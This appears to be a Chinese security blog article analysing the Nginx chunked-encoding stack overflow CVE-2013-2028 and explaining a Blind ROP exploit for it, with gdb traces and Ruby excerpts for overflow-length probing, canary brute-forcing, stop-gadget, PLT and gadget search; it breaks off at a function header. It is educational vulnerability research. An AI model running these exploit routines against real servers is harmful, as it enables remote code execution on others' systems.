> 原文链接: https://www.anquanke.com//post/id/85331 


# 【技术分享】BROP Attack之Nginx远程代码执行漏洞分析及利用


                                阅读量   
                                **234086**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



****

**[![](https://p0.ssl.qhimg.com/t0136bccb8e50e424c2.jpg)](https://p0.ssl.qhimg.com/t0136bccb8e50e424c2.jpg)**

**作者：**[**k0pwn_ko******](http://bobao.360.cn/member/contribute?uid=1353169030)

**预估稿费：700RMB**

**<strong><strong>投稿方式：发送邮件至**[**linwei#360.cn**](mailto:linwei@360.cn)**，或登陆**[**网页版**](http://bobao.360.cn/contribute/index)**在线投稿**</strong></strong>

**<br>**

**前言**

Blind ROP是一种很有意思的攻击方式，其实很多国外文章，以及原来乌云知识库中的一篇文章都有介绍，我把这些参考文章都放在结尾位置，感兴趣的小伙伴可以一起学习交流一下。作为Flappy pig战队的脑残粉，我也会时时关注CTF的动态，听说Blind ROP也出现在了今年的HCTF的pwn题中，文后我会附上z神的github，里面有HCTF的这道BROP pwn题。

最近也跟着joker师傅和muhe师傅一起看了看关于Blind ROP的东西，这是个非常有意思的利用方式，虽然比较复杂，但同时也很佩服这个利用的脑洞，攻防对抗就是不断在这种精彩的利用和缓解中提升的。

对于CTF我不是特别了解，但是在学习的过程中，通过一个Nginx的老洞，总算“认识”了Blind ROP，受益匪浅，同时也感谢joker师傅，muhe师傅，swing师傅在学习过程中的讨论和指导。

下面我将就Nginx漏洞原理，以及这个Nginx漏洞的Exploit来全方位浅析BROP这种利用方式，关于这个漏洞的原理，网上有详细说明，这里我将结合Exploit的利用来讲解整个过程。文中有失误的地方还请师傅们多多包含，多多批评指正（毕竟通读2000+行ruby太痛苦T.T）。

<br>

**Nginx漏洞分析（CVE-2013-2028）**



这是一个Nginx的栈溢出漏洞，我的分析环境是在x86下，而利用是在x86_64下，我本来是不想这样的，但是之前在x86下用msf复现了Nginx这个漏洞，顺道进行了分析，然后拿到Exploit的时候又在x86_64下进行了BROP的利用研究，不过这个系统版本不影响我们对漏洞的理解，利用的分析。

关于漏洞环境以及Nginx安装搭建这里我就不多说了，文后的参考文章中，我会提供一个搭建环境，按那个搭没错，这里漏洞分析我的环境是Ubuntu 13.04 x86，利用分析环境是Kali 2.0。

搭建好环境之后用“#/usr/local/nginx/nginx”运行nginx服务，有的环境下是“#/usr/local/nginx/sbin/nginx”，运行服务后，用gdb attach方法附加，之后通过msf方法发送Exploit，这里我碰到过一种情况，就是msf发送Exploit的时候，会提示ERRCONNECT，这时候可以通过set target 0的方法设置好目标对象，而不用auto target，应该就可以了。发送Exploit之后，首先我们来看一下发送的数据包。

[![](https://p3.ssl.qhimg.com/t01d3985aa12058b6ed.png)](https://p3.ssl.qhimg.com/t01d3985aa12058b6ed.png)

一共发送了两个GET包，在后面的畸形字符串前，包含了一个Encoding字段，值为chunked，而第一个数据包，同样也包含了一个值为chunked，但不带畸形数据，后面会解释为什么要发送两个，这时Nginx捕获到了崩溃。

[![](https://p0.ssl.qhimg.com/t01847fe2b6329b3e66.png)](https://p0.ssl.qhimg.com/t01847fe2b6329b3e66.png)

崩溃状况下，通过bt的方法回溯一下堆栈调用。



```
gdb-peda$ bt
#0  0xb77d5424 in __kernel_vsyscall ()
#1  0xb7596b1f in raise () from /lib/i386-linux-gnu/libc.so.6
#2  0xb759a0b3 in abort () from /lib/i386-linux-gnu/libc.so.6
#3  0xb75d3ab5 in ?? () from /lib/i386-linux-gnu/libc.so.6
#4  0xb766ebc3 in __fortify_fail () from /lib/i386-linux-gnu/libc.so.6
#5  0xb766eb5a in __stack_chk_fail () from /lib/i386-linux-gnu/libc.so.6
#6  0x0807b4c3 in ngx_http_read_discarded_request_body (r=r@entry=0x83f7838)
    at src/http/ngx_http_request_body.c:676
#7  0x0807bdf7 in ngx_http_discard_request_body (r=r@entry=0x83f7838)
    at src/http/ngx_http_request_body.c:526
#8  0x08087a98 in ngx_http_static_handler (r=0x83f7838)
    at src/http/modules/ngx_http_static_module.c:211
#9  0x0806fb2b in ngx_http_core_content_phase (r=0x83f7838, ph=0x84022b8)
    at src/http/ngx_http_core_module.c:1415
```

这里问题出在stack_chk_fail，也就是canary的检查失败了，导致了程序异常中断，这个bt回溯内容很长，这里我就不讲述回溯过程了，我们直接来正向动静结合分析一下整个漏洞的成因。首先我们发送的数据包包含chunked字段。这样会进行一次if语句比较，然后给一个r在结构体的headers_in的chunked成员变量赋值。src/http/ngx_http_request.c:1707：



```
ngx_int_t
ngx_http_process_request_header(ngx_http_request_t *r)
`{`
    if (r-&gt;headers_in.transfer_encoding) `{`
        if (r-&gt;headers_in.transfer_encoding-&gt;value.len == 7
            &amp;&amp; ngx_strncasecmp(r-&gt;headers_in.transfer_encoding-&gt;value.data,
                               (u_char *) "chunked", 7) == 0)
        `{`
            r-&gt;headers_in.content_length = NULL;
            r-&gt;headers_in.content_length_n = -1;
            r-&gt;headers_in.chunked = 1;
        `}`
```

如果看之前的bt回溯可以看到，这个r结构体经常会作为参数被引用到，这个r结构体是一个Nginx HTTP请求的结构体，其定义如下：

```
typedef struct ngx_http_request_s     ngx_http_request_t;
```

通过这种定义，我们能直接用p命令来打印整个结构体的内容。



```
gdb-peda$ p *(struct ngx_http_request_s*)0x83f7838
$1 = `{`
  headers_in = `{`
    headers = `{`
      last = 0x83f7870, 
      part = `{`
      `}`, 
      size = 0x18, 
      nalloc = 0x14, 
      pool = 0x83f7810
    `}`, 
    host = 0x83f7d9c, 
    connection = 0x0, 
    if_modified_since = 0x0, 
    if_unmodified_since = 0x0, 
    if_match = 0x0, 
    if_none_match = 0x0, 
    user_agent = 0x0, 
    referer = 0x0, 
    content_length = 0x0, 
    content_type = 0x0, 
    range = 0x0, 
    if_range = 0x0, 
    transfer_encoding = 0x83f7db4, 
    expect = 0x0, 
    upgrade = 0x0, 
    accept_encoding = 0x0, 
    via = 0x0, 
    authorization = 0x0, 
    keep_alive = 0x0, 
    x_forwarded_for = `{`
    `}`, 
    user = `{`
    `}`, 
    passwd = `{`
    `}`, 
    cookies = `{`
    `}`, 
    server = `{`
      l
  `}`, 
  headers_out = `{`
```

这里我列举了成员变量headers_in的内容，除了这个成员变量还有很多，感兴趣的小伙伴可以直接在源码中找到，在这个漏洞中，我们只关心headers_in中的部分成员，因此后续分析中，我只列举关键的成员变量值，结构体名字太长，后面都称之为r结构体。。

回到刚才if语句位置，在ngx_http_process_request_header函数下断点进行单步跟踪。



```
gdb-peda$ b *ngx_http_process_request_header
Breakpoint 2 at 0x80741ad: file src/http/ngx_http_request.c, line 1707.
[-------------------------------------code-------------------------------------]
   0x80741a4 &lt;ngx_http_request_finalizer+18&gt;:call   0x80737ef &lt;ngx_http_finalize_request&gt;
   0x80741a9 &lt;ngx_http_request_finalizer+23&gt;:add    esp,0x1c
   0x80741ac &lt;ngx_http_request_finalizer+26&gt;:ret    
=&gt; 0x80741ad &lt;ngx_http_process_request_header&gt;:push   ebx
[------------------------------------stack-------------------------------------]
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
```

命中函数入口位置，这个时候查看r结构体中的chunked对象。



```
gdb-peda$ p *(struct ngx_http_request_s*)0x83f7838
$1 = `{`
  headers_in = `{`
    chunked = 0x0,
```

这个值还是0x0，接下来开始单步跟踪。



```
gdb-peda$ ni
[----------------------------------registers-----------------------------------]
EAX: 0x83f7443 ("Chunked")
EBX: 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bT326?b306,ab")
ECX: 0xa ('n')
EDX: 0x0 
ESI: 0x83fd6ec --&gt; 0x83f7950 --&gt; 0x0 
EDI: 0x1 
EBP: 0x8403ac8 --&gt; 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bT326?b306,ab")
ESP: 0xbfc6b650 --&gt; 0x83f7443 ("Chunked")
EIP: 0x8074314 (&lt;ngx_http_process_request_header+359&gt;:call   0x804f8cf &lt;ngx_strncasecmp&gt;)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8074306 &lt;ngx_http_process_request_header+345&gt;:mov    DWORD PTR [esp+0x4],0x80b0586
   0x807430e &lt;ngx_http_process_request_header+353&gt;:mov    eax,DWORD PTR [eax+0x10]
   0x8074311 &lt;ngx_http_process_request_header+356&gt;:mov    DWORD PTR [esp],eax
=&gt; 0x8074314 &lt;ngx_http_process_request_header+359&gt;:call   0x804f8cf &lt;ngx_strncasecmp&gt;
Guessed arguments:
arg[0]: 0x83f7443 ("Chunked")
arg[1]: 0x80b0586 ("chunked")
arg[2]: 0x7
```

单步跟踪到0x8074314地址位置，调用了strncasecmp做比较，比较的两个值就是chunked，这时候数据包包含chunked，所以会进入刚才源码中的if语句处理，处理后再看r结构体的chunked变量已经被赋值。



```
gdb-peda$ ni
[----------------------------------registers-----------------------------------]
[-------------------------------------code-------------------------------------]
   0x807431d &lt;ngx_http_process_request_header+368&gt;:mov    DWORD PTR [ebx+0x70],0x0
   0x8074324 &lt;ngx_http_process_request_header+375&gt;:mov    DWORD PTR [ebx+0xdc],0xffffffff
   0x807432e &lt;ngx_http_process_request_header+385&gt;:mov    DWORD PTR [ebx+0xe0],0xffffffff
=&gt; 0x8074338 &lt;ngx_http_process_request_header+395&gt;:or     BYTE PTR [ebx+0xe8],0x4
[------------------------------------stack-------------------------------------]
0000| 0xbfc6b650 --&gt; 0x83f7443 ("Chunked")
0004| 0xbfc6b654 --&gt; 0x80b0586 ("chunked")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
1749            r-&gt;headers_in.chunked = 1;
gdb-peda$ p *(struct ngx_http_request_s*)0x83f7838
$2 = `{`
  headers_in = `{`
    chunked = 0x1,
```

随后，程序会进入漏洞触发的关键函数ngx_http_discard_request_body，这个函数中会有一处对chunked的值进行判断，如果chunked的值为1，则会进入到if语句内部处理逻辑，会调用另一个函数ngx_http_discard_request_body_filter。



```
ngx_http_discard_request_body(ngx_http_request_t *r)
`{`
    if (size || r-&gt;headers_in.chunked) `{`
        rc = ngx_http_discard_request_body_filter(r, r-&gt;header_in);
        if (rc != NGX_OK) `{`
            return rc;
        `}`
        if (r-&gt;headers_in.content_length_n == 0) `{`
            return NGX_OK;
        `}`
    `}`
    ngx_http_read_discarded_request_body
```

在执行完ngx_http_discard_request_body离开if语句的逻辑之后，会执行ngx_http_read_discarded_request_body，也就是刚才在回溯过程中stack_chk所在的最内层漏洞函数，首先我们来看一下ngx_http_discard_request_body_filter函数。



```
src/http/ngx_http_request_body.c:679
static ngx_int_t
ngx_http_discard_request_body_filter(ngx_http_request_t *r, ngx_buf_t *b)
`{`
     for ( ;; ) `{`
            rc = ngx_http_parse_chunked(r, b, rb-&gt;chunked);
            if (rc == NGX_OK) `{`
                /* a chunk has been parsed successfully */
            `}`
            if (rc == NGX_DONE) `{`
                /* a whole response has been parsed successfully */
            `}`
            if (rc == NGX_AGAIN) `{`
                /* set amount of data we want to see next time */
                r-&gt;headers_in.content_length_n = rb-&gt;chunked-&gt;length;
                break;
            `}`
```

注意在for循环中会进行三个if语句逻辑处理，分别对应三种NGX状态，在rc==NGX_AGAIN的时候，会对content_length_n成员变量进行赋值。NGX_AGAIN就是要第二次接收时才会触发，因此这就解释了在之前我们提到的为什么要发两个数据包的问题。

在这个函数下断点进行单步跟踪。首先会判断if语句中NGX状态。



```
gdb-peda$ ni
   0x807aada &lt;ngx_http_discard_request_body_filter+282&gt;:cmp    eax,0xfffffffe
=&gt; 0x807aadd &lt;ngx_http_discard_request_body_filter+285&gt;:jne    0x807aafe &lt;ngx_http_discard_request_body_filter+318&gt;
Legend: code, data, rodata, value
0x0807aadd735            if (rc == NGX_AGAIN) `{`
```

这里判断通过，会进入到这个if语句中进行处理。



```
gdb-peda$ ni
[----------------------------------registers-----------------------------------]
EAX: 0xfffffffe 
EBX: 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
ECX: 0xfdffffff 
EDX: 0xfdffbbff 
ESI: 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
EDI: 0x83f7ffc --&gt; 0x0 
EBP: 0x83f10e4 --&gt; 0x83f7808 --&gt; 0x0 
ESP: 0xbfc6b2e0 --&gt; 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
EIP: 0x807aadf (&lt;ngx_http_discard_request_body_filter+287&gt;:mov    eax,DWORD PTR [edi+0x1c])
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x807aad5 &lt;ngx_http_discard_request_body_filter+277&gt;:jmp    0x807aba2 &lt;ngx_http_discard_request_body_filter+482&gt;
   0x807aada &lt;ngx_http_discard_request_body_filter+282&gt;:cmp    eax,0xfffffffe
   0x807aadd &lt;ngx_http_discard_request_body_filter+285&gt;:jne    0x807aafe &lt;ngx_http_discard_request_body_filter+318&gt;
=&gt; 0x807aadf &lt;ngx_http_discard_request_body_filter+287&gt;:mov    eax,DWORD PTR [edi+0x1c]
   0x807aae2 &lt;ngx_http_discard_request_body_filter+290&gt;:mov    edx,DWORD PTR [eax+0x10]
   0x807aae5 &lt;ngx_http_discard_request_body_filter+293&gt;:mov    eax,DWORD PTR [eax+0xc]
   0x807aae8 &lt;ngx_http_discard_request_body_filter+296&gt;:mov    DWORD PTR [esi+0xdc],eax
   0x807aaee &lt;ngx_http_discard_request_body_filter+302&gt;:mov    DWORD PTR [esi+0xe0],edx
[------------------------------------stack-------------------------------------]
0000| 0xbfc6b2e0 --&gt; 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
0004| 0xbfc6b2e4 --&gt; 0x83f10e4 --&gt; 0x83f7808 --&gt; 0x0 
0008| 0xbfc6b2e8 --&gt; 0x83f8020 --&gt; 0x1 
0012| 0xbfc6b2ec --&gt; 0xb77df9b2 (cmp    eax,0x0)
0016| 0xbfc6b2f0 --&gt; 0xbfc6b370 --&gt; 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
0020| 0xbfc6b2f4 --&gt; 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
0024| 0xbfc6b2f8 --&gt; 0x83f7fb6 ("/index.html")
0028| 0xbfc6b2fc --&gt; 0x806fa75 (&lt;ngx_http_map_uri_to_path+402&gt;:jmp    0x806fad9 &lt;ngx_http_map_uri_to_path+502&gt;)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
739                r-&gt;headers_in.content_length_n = rb-&gt;chunked-&gt;length;
gdb-peda$ ni
=&gt; 0x807aaf4 &lt;ngx_http_discard_request_body_filter+308&gt;:mov    eax,0x0
Legend: code, data, rodata, value
764    return NGX_OK;
```

这里赋值之后，我们来看一下r结构体中关于content_length_n的成员变量的值。



```
gdb-peda$ p *(struct ngx_http_request_s*)0x83f7838
$3 = `{`
  headers_in = `{`
    content_length_n = 0xfdffbbffa8afed92, 
    keep_alive_n = 0xffffffff, 
    connection_type = 0x0, 
    chunked = 0x1,
```

赋值之后，content_length_n的值变成了一个极大的值，随后返回值后，进入ngx_http_read_discarded_request_body函数处理。

```
src/http/ngx_http_request_body.c:676
static ngx_int_t
ngx_http_read_discarded_request_body(ngx_http_request_t *r)
`{`
    size_t     size;
    ssize_t    n;
    ngx_int_t  rc;
    ngx_buf_t  b;
    u_char     buffer[NGX_HTTP_DISCARD_BUFFER_SIZE];
    ngx_log_debug0(NGX_LOG_DEBUG_HTTP, r-&gt;connection-&gt;log, 0,
                   "http read discarded body");
    ngx_memzero(&amp;b, sizeof(ngx_buf_t));
    b.temporary = 1;
    for ( ;; ) `{`
        if (r-&gt;headers_in.content_length_n == 0) `{`
            r-&gt;read_event_handler = ngx_http_block_reading;
            return NGX_OK;
        `}`
        if (!r-&gt;connection-&gt;read-&gt;ready) `{`
            return NGX_AGAIN;
        `}`
        size = (size_t) ngx_min(r-&gt;headers_in.content_length_n,
                                NGX_HTTP_DISCARD_BUFFER_SIZE);//key！！
        n = r-&gt;connection-&gt;recv(r-&gt;connection, buffer, size);//key！！
```

两个key中，第一处会进行一处比较，这个值调用了ngx_min函数，这个函数会取content_length_n和NGX_HTTP_DISCARD_BUFFER_SIZE中小的数值，而NGX_HTTP_DISCARD_BUFFER_SIZE就是函数开头定义的buffer的长度。



```
#define NGX_HTTP_DISCARD_BUFFER_SIZE       4096
#define NGX_HTTP_LINGERING_BUFFER_SIZE     4096
```

注意一下刚才content_length_n的长度，是一个负数，这里比较时会进行有符号数比较，会取这个负数，也就是content_length_n，动态跟踪一下。



```
gdb-peda$ p *(struct ngx_http_request_s*)0x83f7838
$4 = `{`
  headers_in = `{`
    content_length_n = 0xfdffbbffa8afed92, 
    keep_alive_n = 0xffffffff, 
    connection_type = 0x0, 
    chunked = 0x1, 
gdb-peda$ ni
[----------------------------------registers-----------------------------------]
EAX: 0x8403ac8 --&gt; 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
EBX: 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
ECX: 0xa8afed92 
EDX: 0xfdffbbff 
ESI: 0xbfc6a31c --&gt; 0x0 
EDI: 0x841ba78 --&gt; 0x8403ac8 --&gt; 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
EBP: 0x83f7fe2 --&gt; 0xc1404900 
   0x807b441 &lt;ngx_http_read_discarded_request_body+96&gt;:test   edx,edx
=&gt; 0x807b443 &lt;ngx_http_read_discarded_request_body+98&gt;:js     0x807b452 &lt;ngx_http_read_discarded_request_body+113&gt;
Legend: code, data, rodata, value
0x0807b443649        size = (size_t) ngx_min(r-&gt;headers_in.content_length_n,
gdb-peda$ ni
[----------------------------------registers-----------------------------------]
EAX: 0x8403ac8 --&gt; 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
EBX: 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
ECX: 0xa8afed92 
EDX: 0xfdffbbff 
ESI: 0xbfc6a31c --&gt; 0x0 
EDI: 0x841ba78 --&gt; 0x8403ac8 --&gt; 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
EBP: 0x83f7fe2 --&gt; 0xc1404900 
ESP: 0xbfc6a2d0 --&gt; 0x0 
EIP: 0x807b452 (&lt;ngx_http_read_discarded_request_body+113&gt;:mov    DWORD PTR [esp+0x8],ecx)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
   0x807b44d &lt;ngx_http_read_discarded_request_body+108&gt;:mov    ecx,0x1000
=&gt; 0x807b452 &lt;ngx_http_read_discarded_request_body+113&gt;:mov    DWORD PTR [esp+0x8],ecx
Legend: code, data, rodata, value
652        n = r-&gt;connection-&gt;recv(r-&gt;connection, buffer, size);
```

注意一下ngx_min函数调用前的content_length_n的值，在比较时ecx存放后8位，edx存放前8位，随后会将ecx的值交给size，这个值是个极大值，比4096大很多，随后会进行recv，这时候接收可以接收一个超过buffer大小4096的数据，造成栈溢出。



```
gdb-peda$ ni
[-------------------------------------code-------------------------------------]
   0x807b45a &lt;ngx_http_read_discarded_request_body+121&gt;:mov    DWORD PTR [esp],eax
=&gt; 0x807b45d &lt;ngx_http_read_discarded_request_body+124&gt;:call   DWORD PTR [eax+0x10]
Guessed arguments:
arg[0]: 0x8403ac8 --&gt; 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
arg[1]: 0xbfc6a31c --&gt; 0x0 
arg[2]: 0xa8afed92 
[------------------------------------stack-------------------------------------]
0000| 0xbfc6a2d0 --&gt; 0x8403ac8 --&gt; 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
0004| 0xbfc6a2d4 --&gt; 0xbfc6a31c --&gt; 0x0 
0008| 0xbfc6a2d8 --&gt; 0xa8afed92 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0807b45d652        n = r-&gt;connection-&gt;recv(r-&gt;connection, buffer, size);
gdb-peda$ ni
[----------------------------------registers-----------------------------------]
ESI: 0xbfc6a31c ("9e8d8fbadefbd9b9bffae9aaac9addfac8ffccc9a998cafee8a9ecbebcbcffec9aed9bRduGkRAiLkyCyQhOEKNOzvHJdgKvWBCREHrVtCWlrpKklSOhAJEkkqMHrjbjnFzlQNnnjFLsfGOcLWsHIajzlxxDTUoHoQBZpDbRqNpMzbMUVbOzEvrkCORulMEECElSfQ"...)
[-------------------------------------code-------------------------------------]
   0x807b45d &lt;ngx_http_read_discarded_request_body+124&gt;:call   DWORD PTR [eax+0x10]
=&gt; 0x807b460 &lt;ngx_http_read_discarded_request_body+127&gt;:cmp    eax,0xffffffff
[------------------------------------stack-------------------------------------]
0000| 0xbfc6a2d0 --&gt; 0x8403ac8 --&gt; 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
0004| 0xbfc6a2d4 --&gt; 0xbfc6a31c ("9e8d8fbadefbd9b9bffae9aaac9addfac8ffccc9a998cafee8a9ecbebcbcffec9aed9bRduGkRAiLkyCyQhOEKNOzvHJdgKvWBCREHrVtCWlrpKklSOhAJEkkqMHrjbjnFzlQNnnjFLsfGOcLWsHIajzlxxDTUoHoQBZpDbRqNpMzbMUVbOzEvrkCORulMEECElSfQ"...)
0008| 0xbfc6a2d8 --&gt; 0xa8afed92 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
654        if (n == NGX_ERROR) `{`
gdb-peda$ x/30x 0xbfc6a31c
0xbfc6a31c:0x643865390x616266380x626665640x39623964
0xbfc6a32c:0x616666620x616139650x613963610x61666464
0xbfc6a33c:0x666638630x396363630x383939610x65666163
0xbfc6a34c:0x396138650x656263650x636263620x63656666
```

可以看到，recv之后，已经接收到了畸形字符串，并且拷贝到buffer中，造成了栈溢出，这时候，由于Canary被畸形字符串覆盖，从而导致了stack_chk失败，而下一步，我们就要通过Blind ROP来完成对Nginx的攻击。

**<br>**

**360度无死角浅析Blind ROP Attack**

关于Blind ROP网上有很多介绍，这里，我将结合Exploit来分解每一步的过程，在这之前，我想大概说明一下，关于Blind ROP的使用环境。首先Blind ROP是我们不知道目标环境的情况下使用的，也就是不能直接构造ROP gadget。

目标服务在崩溃后会重新运行

Canary不会重置，没有ASLR

这是因为Blind ROP其实核心部分都是类似于爆破的概念，因此会不断的引起目标服务崩溃，挂起，如果崩溃后不能重新启动，且启动后Canary或者其他地址改变，那么之前的爆破也就无意义了。那么Blind ROP每一步在做什么呢。

爆破Canary

获取Hang addr和PLT

找到BROP gadget

找到strcmp plt和write plt

Dump内存，执行shellcode

Blind ROP由于不知道目标环境，因此，我们就用write(socket,buf,size)的方法，dump出内存，从而获取gadget最后形成一个可用的ROP gadget，后面就是我们常规Attack的方法了，因此，在这之前，才是Blind ROP的核心，下面，我们就从Exploit入手，来分解这个核心过程。

首先，我们发现了一个栈溢出，需要找到这个栈溢出的准确位置，因为我们没有获取目标服务的elf，因此就用探测的方法来获取到溢出的长度，也就是刚刚崩溃的位置。



```
def find_overflow_len()#测试溢出长度，olen是实例变量
ws = 8
olen = ws #长度为8，前面4096已有
while true
stuff = "A" * olen 填充8个字节
r = try_exp_print(olen, stuff)#尝试溢出
break if r == RC_CRASH #崩溃了，就返回
olen += ws #否则尝试再加8字节长度
end
abort("unreliable") if olen == ws 
olen -= ws
while true #判断olen准确溢出长度
stuff = "A" * olen
r = try_exp_print(olen, stuff)
break if r == RC_CRASH
olen += 1
end
olen -= 1
@olen = olen
print("nFound overflow len #`{`olen`}`n")#实例变量赋值，打印长度
end
```

    4096已经定义好了，其实我们也可以从0开始，olen是一个实例变量，标记4096后的崩溃长度。最后可以获取到溢出的长度。

[![](https://p5.ssl.qhimg.com/t01898a5374a9e8a33e.jpg)](https://p5.ssl.qhimg.com/t01898a5374a9e8a33e.jpg)

当我们获取到崩溃长度后，根据Canary-&gt;EBP-&gt;Ret的栈结构，我们可以开始爆破Canary，爆破的方法就是一字节一字节爆破。

[![](https://p5.ssl.qhimg.com/t017a96cf4af23f6410.png)](https://p5.ssl.qhimg.com/t017a96cf4af23f6410.png)

这样，当我们第一字节从00开始爆破，当爆破到正确Canary的字节的时候，就不会崩溃，这时候再对第二字节进行爆破，以此类推。爆破出正确的Canary。



```
def find_rip()
words = []
while true #进入循环
stuff = "A" * @olen
stuff &lt;&lt; words.pack("Q#`{`@endian`}`*")
inf = []
w = stack_read_word(stuff, inf)#根据olen，依次读取栈中canary，rbp，ret等地址
if w == nil
print("Can't find stack word...n")
print("Setting stack to zerosn")
words = Array.new(words.length) `{` |i| 0 `}`
next
end
print("Stack has #`{`w.to_s(16)`}`n")
words &lt;&lt; w
next if not found_rip(w)
```

    stack_read_word是这个方法的核心函数，它会从Canary开始一字节一字节进行测试，方法就是之前我提到的，会分别爆破出栈中canary，rbp和ret的地址。

[![](https://p4.ssl.qhimg.com/t018407c2266eed0323.jpg)](https://p4.ssl.qhimg.com/t018407c2266eed0323.jpg)

 随后就是找hang gadget了，这个也叫stop gadget，这种特殊的地址，既不会造成Nginx崩溃，也不会造成Nginx返回内容，而是让进程进入无限循环，挂起或者sleep的状态，它是我们后面寻找BROP gadget的重要依据。



```
def find_inf()#找到hang addr  stop gadget
addr = @origin
addr += 0x1000 #跳过init部分
while true
addr += 0x10
rop = []
2.times do
rop &lt;&lt; addr
end
rop &lt;&lt; DEATH
r = try_rop_print(addr, rop)
next if r != RC_INF #如果没有hang，进行下一轮
next if not paranoid_inf(addr)#找plt
@inf = addr
print("Found inf at 0x#`{`@inf.to_s(16)`}`n")
break
end
end
```

这个hang gadget，就像之前我说的一样，同样，plt的原理和hang gadget很像。因此会在找hang gadget的时候，会执行paranoid_inf函数去找plt，这个函数中会调用try_plt，在这之前我大概说一下为什么找plt的原理和hang gadget很像。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t015e8321573a707c74.png)

plt项是连续的，而且在0字节，和6字节之后执行的内容都会正常进入后续处理，而不会崩溃或有返回，因此只要连续有多个16字节都会让进程block且每个16字节地址+6之后，也会block，那么这就有可能是个plt项。



```
def try_plt(addr, inf = @inf)  #找plt的核心函数
rop = [] #连续寻找16字节对齐地址，以及+6位置，两个汇编指令是否会crash，不会的话就可能是plt项
rop &lt;&lt; addr
rop &lt;&lt; (addr + 6)
rop &lt;&lt; inf
rop &lt;&lt; inf
r = try_rop_print(addr, rop)
return false if r != RC_INF
rop = []
rop &lt;&lt; addr
rop &lt;&lt; (addr + 6)
rop &lt;&lt; DEATH
r = try_rop_print(addr, rop)
return false if r != RC_CRASH
return true
end
```

这样，就可以找到hang gadget和plt项，这两个都是在后续Exploit中的重要的组件。

[![](https://p3.ssl.qhimg.com/t017f96bf591fc1b80d.jpg)](https://p3.ssl.qhimg.com/t017f96bf591fc1b80d.jpg)

接下来，有了hang gadget，我们就可以找到BROP gadget了，这个BROP gadget，是我们组成在开头提到通过write方法dump内存的重要部分，和ROP gadget的概念很像，为了组成这个write函数，需要三个参数，也就是需要三个ROP gadget：pop rdi,ret;  pop rsi,ret;  pop rdx,ret;  因为在64位Linux中，参数不是靠push寄存器入栈决定的，而是由寄存器本身决定的，这三个参数对应的就是rdi，rsi和rdx寄存器中的内容。因此我们利用hang gadget来暴力搜索这些BROP gadget，如何判断呢？

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01e31286204ab59136.png)

在ret后放很多hang addr，只要命中pop ret，pop pop ret这种gadget，都会进入block状态，通过这种方法，我们找到6个pop ret，就能找到一个在linux下常见的结构，通过计算这个结构的偏移，就能得到pop rsi,ret和pop rdi,ret了。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t012a1e3d40839a8cf1.png)

为了找到这6个pop，我们就在ret后放6个crash gadget，然后放一个hang gadget，这样碰到6个pop的时候，之前的crash gadget会全部出栈，ret后会block，而其他情况，都会处于crash的状态。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0105222088052de625.png)

这样就可以找到6个pop了，然后再通过计算偏移，可以找到pop rsi,ret和pop rdi,ret，换句话说，找到能对rsi和rdi寄存器赋值的gadget即可。



```
def find_gadget()
